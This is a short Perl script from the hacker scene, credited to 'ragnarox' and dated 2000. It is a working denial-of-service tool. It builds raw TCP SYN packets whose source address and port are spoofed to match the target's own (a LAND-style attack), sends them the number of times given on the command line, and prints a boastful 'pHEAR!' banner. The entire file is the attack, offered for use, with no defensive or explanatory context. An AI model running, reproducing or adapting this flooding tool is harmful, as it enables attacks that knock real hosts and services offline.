#!/usr/bin/perl -w
# Syn DoS by ragnarox
# (phedz.org && r00tabega.com)
# 04/12/00  (5:17pm)  hehe
# 
# This program requires Net::RawIP which can be downloaded from
# http://search.cpan.org/ .
#
# Its like.. GNU and shit too.  heh

require 'getopts.pl';
use Net::RawIP;
Getopts('i:p:n:');
$a = new Net::RawIP;

die "Usage $0 -i <target> -p <target port> -n <number of times>\nBy ragnarox"
unless ($opt_i && $opt_p && $opt_n);


$a->set({ ip => {saddr => $opt_i,
		 daddr => $opt_i
		},
	 tcp => {dest => $opt_p,
	         source => $opt_p,
		 psh => 1,
		 syn => 1}
	});


for($x=0;$x<=$opt_n;$x++) {
$a->send;
}

print "\npHEAR!";
print "\n\nTarget: $opt_i";
print "\nPort: $opt_p";
print "\nAttacks: $opt_n\n\n";
print "\nragnarox  (phedz.org && r00tabega.com)\n";